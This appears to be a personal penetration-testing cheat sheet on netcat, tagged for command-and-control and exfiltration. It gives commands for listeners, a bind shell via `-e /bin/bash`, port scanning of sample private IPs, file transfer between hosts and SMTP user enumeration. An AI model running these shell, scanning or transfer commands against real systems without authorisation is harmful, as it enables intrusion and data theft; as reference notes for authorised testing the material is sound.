---
tags:
  - "#type/tool"
  - "#attack/command-and-control"
  - "#attack/discovery"
  - "#attack/exfiltration"
Link:
Purpose: simple tool for connect shell and listeners
---
# Info

simple tool to setup shell listeners and connect to shell

windows executables: <https://github.com/int0x33/nc.exe/>

more sophisticated alternative: [[3 Tools/shells/Socat]]

For stabilisation see [[2 Tech-Specifics/OS/Linux/Reverse Shell Stabalisation|Reverse Shell Stabalisation Linux]] and [[2 Tech-Specifics/OS/Windows/Reverse Shell Stabilisation|Reverse Shell Stabilisation Windows]].

# Usage

- start listener: `nc -lnvp <port>
- connect to machine: `nc <target-ip> <chosen-port>`
	- start bind shell running bash: `nc -nv <target-ip> <chosen-port> -e /bin/bash`

| Option         | Purpose                                         |
| -------------- | ----------------------------------------------- |
| `-e`           | execute command                                 |
| `-lnvp <port>` | listen<br>no name resolution<br>verbose<br>port |
| `-z`           | zero io mode                                    |
| `-u`           | use UDP                                         |
| `-w`           | timeout                                         |

## Port forwarding

Combine nc with named FIFO Pipe.

See: https://gist.github.com/holly/6d52dd9addd3e58b2fd5

# Snippets

## Port Scanning

TCP Scan`nc -nvv -w 1 -z [IP] [START_PORT-END_PORT]`

- eg. `nc -nvv -w 1 -z 192.168.50.152 3388-3390`

UDP Scan: same as tcp scan, use `-u` additionally

- if filtered, ports will be listed as open because no "ICMP port unreachable" is received

## File Transfer

> [!Hint] Hint
> After completing the file transfer, both client and server will hang - the process must be terminated manually.

**Listener on receiver side:**

- on receiver: `nc -lnvp <port> > <filepath>`
- on sender: `nc -n <ip> <port> < <filepath>`

**Listener on sender side:**
- on receiver: `nc -n <ip> <port> > <filepath>`
- on sender: `nc -lnvp <port> < <filepath>`

## Manual SMTP Connection

connect to port 25, send [[2 Tech-Specifics/Network/Protocols/TCP 25 SMTP|SMTP]] commands manually

``` shell
nc -nv 192.168.50.8 25
VRFY root
```
